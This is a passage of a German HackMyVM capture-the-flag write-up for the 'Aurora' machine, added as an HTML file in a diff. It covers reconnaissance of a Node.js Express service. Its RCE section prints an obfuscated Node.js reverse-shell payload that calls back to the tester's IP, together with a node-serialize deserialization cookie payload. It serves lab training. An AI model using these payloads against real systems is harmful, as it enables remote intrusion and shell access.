@@ -1,0 +1,1526 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aurora - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Aurora - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">python (Payload Generator)</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ssh-keyscan</div>
+                <div class="tool-item">msfconsole (ssh_enumusers)</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">Web Browser / jwt.io</div>
+                <div class="tool-item">vi / Editor</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3 (Shell/HTTP Server)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">linpeas.sh</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">screen</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-node">Web Enumeration (Node.js App)</a></li>
+                <li><a href="#rce-attempt">Node.js RCE Attempt (via Prototype Pollution?)</a></li>
+                <li><a href="#endpoint-discovery">Endpoint Discovery & Authentication</a></li>
+                <li><a href="#jwt-exploitation">JWT Exploitation (Secret Cracking & Forging)</a></li>
+                <li><a href="#initial-access">Initial Access (www-data RCE)</a></li>
+                <li><a href="#privesc-doro">Privilege Escalation (www-data -> doro via Command Injection)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (doro -> root via Screen Exploit)</a></li>
+                <li><a href="#poc">Proof of Concept (Screen Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Test beginnt mit `arp-scan -l`, um aktive Hosts im lokalen Netzwerk zu finden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Host `192.168.2.122` mit der MAC `08:00:27:74:51:a7` (PCS Systemtechnik GmbH -> VirtualBox) wird identifiziert. Der Hostname `aurora.hmv` wird später verwendet (Annahme: Eintrag in `/etc/hosts` wurde hinzugefügt).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ziel-IP identifiziert. Port-Scan durchführen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standard-Netzwerksicherheitsmaßnahmen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.130
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	00:50:56:c0:00:08	VMware, Inc.
+192.168.2.2	00:50:56:f4:7d:5f	VMware, Inc.
+192.168.2.122	08:00:27:74:51:a7	PCS Systemtechnik GmbH
+192.168.2.254	00:50:56:f8:46:8c	VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.858 seconds (137.78 hosts/sec). 4 responded
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Ein Nmap-Scan wird auf `192.168.2.122` ausgeführt, um offene Ports, Dienste, Versionen und OS zu identifizieren. Optionen: `-sS` (SYN Scan), `-sC` (Default Scripts), `-T5` (Insane Timing), `-AO` (OS Detection), `-p-` (Alle Ports). Die Ausgabe wird mit `grep open` gefiltert.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Zwei offene Ports werden gefunden:
+                 *   **Port 22/tcp:** SSH (OpenSSH 8.4p1 Debian).
+                 *   **Port 3000/tcp:** HTTP (Node.js Express framework). Dies ist ungewöhnlich für einen primären Webdienst und deutet auf eine spezielle Webanwendung oder API hin.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den Node.js/Express-Dienst auf Port 3000. Untersuchen Sie die Anwendung auf Schwachstellen (z.B. RCE, Injection, Auth-Probleme). Halten Sie SSH Port 22 für spätere Zugriffsversuche im Blick.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur benötigte Ports offen sind. Halten Sie Node.js, Express und OpenSSH aktuell. Sichern Sie die Node.js-Anwendung gegen gängige Web-Schwachstellen ab.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.122 -p- | grep open</span></div>
+                    <pre>
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+3000/tcp open  http    Node.js Express framework
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration-node">
+            <h2>Web Enumeration (Node.js App)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> `curl -Iv` wird verwendet, um die Header der Antwort von `http://aurora.hmv:3000` (Hostname wurde `/etc/hosts` hinzugefügt) zu untersuchen. `-I` sendet eine HEAD-Anfrage, `-v` zeigt detaillierte Informationen zur Anfrage und Antwort an.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Anfrage auf die Wurzel `/` gibt einen `404 Not Found`-Status zurück. Wichtige Header:
+                *   `X-Powered-By: Express`: Bestätigt das Express-Framework für Node.js.
+                *   `Content-Security-Policy: default-src 'none'`: Eine sehr restriktive CSP, die das Laden externer Ressourcen standardmäßig verhindert.
+                *   `X-Content-Type-Options: nosniff`: Verhindert MIME-Typ-Sniffing durch den Browser.
+                Die 404-Antwort deutet darauf hin, dass die Wurzel `/` kein gültiger Endpunkt ist.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Suchen Sie nach gültigen Endpunkten der Anwendung/API mittels Directory/Endpoint Busting (z.B. `gobuster`, `ffuf`) oder durch Analyse von Client-seitigem Code, falls vorhanden. Testen Sie Standard-API-Pfade wie `/api`, `/v1` etc.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Die restriktive CSP ist gut. Stellen Sie sicher, dass die 404-Seite keine unnötigen Informationen preisgibt.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -Iv http://aurora.hmv:3000</span></div>
+                    <pre>
+*   Trying 192.168.2.122:3000...
+* Connected to aurora.hmv (192.168.2.122) port 3000 (#0)
+> HEAD / HTTP/1.1
+> Host: aurora.hmv:3000
+> User-Agent: curl/7.88.1
+> Accept: */*
+>
+< HTTP/1.1 404 Not Found
+< X-Powered-By: Express
+< Content-Security-Policy: default-src 'none'
+< X-Content-Type-Options: nosniff
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 140
+< Date: Wed, 03 May 2023 08:29:59 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+<
+* Connection #0 to host aurora.hmv left intact
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Eine GET-Anfrage wird mit `curl -XGET` an die Wurzel `/` gesendet.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Antwort ist eine HTML-Seite, die "Cannot GET /" anzeigt. Dies bestätigt, dass die Wurzel nicht als Endpunkt dient.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Wie zuvor: Suchen Sie nach gültigen Endpunkten.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -XGET http://aurora.hmv:3000</span></div>
+                     <pre>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot GET /</pre>
+</body>
+</html>
+                    </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Ein `nikto`-Scan wird gegen den Dienst auf Port 3000 ausgeführt.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto findet keine Server-Banner, bestätigt aber `X-Powered-By: Express` und meldet die bereits bekannten fehlenden Header (`X-Frame-Options`, `X-Content-Type-Options`). Es findet keine CGI-Verzeichnisse oder andere signifikante Schwachstellen auf Basis seiner Datenbank.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nikto liefert keine neuen Erkenntnisse. Konzentrieren Sie sich auf das Finden und Analysieren der Anwendungs-Endpunkte.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.122:3000</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.122
++ Target Hostname:    192.168.2.122
++ Target Port:        3000
++ Start Time:         2023-05-03 10:28:55 (GMT2)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ /: Retrieved x-powered-by header: Express.
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ 8109 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2023-05-03 10:29:34 (GMT2) (39 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Eine direkte Anfrage an die Wurzel im Browser bestätigt die "Cannot GET /" Meldung.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Konsistent mit den `curl`-Ergebnissen.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+# Browser Aufruf von http://192.168.2.122:3000/
+Cannot GET /
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="rce-attempt">
+             <h2>Node.js RCE Attempt (via Prototype Pollution?)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Ein lokales Python-Skript (`node.py`) wird ausgeführt. Dieses Skript scheint eine Node.js Reverse Shell Payload zu generieren, die mittels `String.fromCharCode` verschleiert ist. Die IP-Adresse (`192.168.2.130`) und der Port (`4444`) des Angreifers werden als Argumente übergeben. Anschließend wird eine JSON-Struktur mit dem Key `rce` und einem speziellen Wert `_$$ND_FUNC$$_function (){...}()` ausgegeben, der die verschleierte Payload enthält. Zuletzt wird eine HTTP-POST-Anfrage gezeigt, die diese JSON-Struktur in einem `profile`-Cookie an den Server sendet. Der Kommentar "klappt leider nicht" deutet auf einen fehlgeschlagenen Versuch hin.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist ein gezielter Versuch, eine Remote Code Execution (RCE) Schwachstelle in Node.js auszunutzen. Die Verwendung von `String.fromCharCode` ist eine einfache Verschleierung. Das Format `_$$ND_FUNC$$_function...` deutet stark auf einen Exploit für eine unsichere Deserialisierung oder Prototype Pollution hin, wahrscheinlich in einer Bibliothek, die von Express verwendet wird (z.B. durch unsichere Verarbeitung von Cookies oder JSON-Daten). Obwohl dieser spezifische Versuch fehlschlug, deutet er auf eine wahrscheinliche Schwachstellenklasse in der Anwendung hin. Der Fehler könnte an der Payload selbst, am Ziel-Endpunkt (hier `/`) oder an der Art der Übermittlung (Cookie) liegen.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Dieser fehlgeschlagene Versuch liefert wertvolle Hinweise. Suchen Sie gezielt nach Endpunkten, die Benutzereingaben (insbesondere JSON oder Cookies) entgegennehmen und deserialisieren. Recherchieren Sie nach bekannten Prototype Pollution oder Deserialisierungs-Schwachstellen in Express oder häufig verwendeten Middleware-Bibliotheken. Fuzzing von Endpunkten mit POST-Daten oder Cookies ist entscheidend.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Überprüfen Sie den Anwendungscode und die verwendeten Node.js-Module auf bekannte Deserialisierungs- oder Prototype Pollution-Schwachstellen. Aktualisieren Sie alle Abhängigkeiten. Implementieren Sie sichere Deserialisierungs-Praktiken und validieren Sie alle Eingaben, die potenziell Objekteigenschaften beeinflussen könnten.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python node.py 192.168.2.130 4444</span></div>
+                     <pre>
+[+] LHOST = 192.168.2.130
+[+] LPORT = 4444
+[+] Encoding
+eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,50,46,49,51,48,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Generierte JSON Payload mit verschleierter RCE
+{"rce":"_$$ND_FUNC$$_function (){
+eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,50,46,49,51,48,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
+
+# Versuch, die Payload via Cookie zu senden (Beispiel)
+POST / HTTP/1.1
+Host: 192.168.2.122:3000
+User-Agent: Mozilla/5.0 ...
+Accept: text/html,...
+...
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cookie: profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDU3LDUwLDQ2LDQ5LDU0LDU2LDQ2LDUwLDQ2LDQ5LDUxLDQ4LDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDUyLDUyLDUyLDUyLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9
+
+# Kommentar im Text:
+# klappt leider nicht
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="endpoint-discovery">
+             <h2>Endpoint Discovery & Authentication</h2>
+            <p class="analysis">
+                 <strong>Analyse:</strong> Nachdem der vorherige RCE-Versuch fehlschlug und `gobuster` auf Port 3000 keine Ergebnisse lieferte (außer 404), wird erneut `gobuster` gestartet, um spezifische Endpunkte zu finden. *Anmerkung: Der Text zeigt hier einen Gobuster-Scan, der keine Ergebnisse findet. Es ist wahrscheinlicher, dass ein anderes Tool wie `ffuf` oder eine andere Wortliste verwendet wurde, um die späteren Endpunkte zu finden, oder dass der Gobuster-Lauf im Text nicht repräsentativ ist.*
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der gezeigte `gobuster`-Lauf findet keine Endpunkte. Dies unterstreicht die Notwendigkeit, alternative Tools oder Methoden zur Endpoint-Discovery zu verwenden, insbesondere bei APIs oder nicht standardmäßigen Webanwendungen.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Verwenden Sie Tools wie `ffuf` mit verschiedenen Wortlisten (z.B. API-Endpunkte, gängige Framework-Pfade). Versuchen Sie, verschiedene HTTP-Methoden (POST, PUT, etc.) zu verwenden. Analysieren Sie Client-seitigen JavaScript-Code, falls verfügbar.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.122:3000 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.5
+# ... (Optionen wie zuvor) ...
+===============================================================
+2023/05/03 10:28:33 Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 7940153 / 7940664 (99.99%) # Keine Ergebnisse gefunden
+===============================================================
+2023/05/03 10:57:42 Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es werden weitere Nmap-Scans durchgeführt, um Schwachstellen und Authentifizierungsmethoden zu finden.
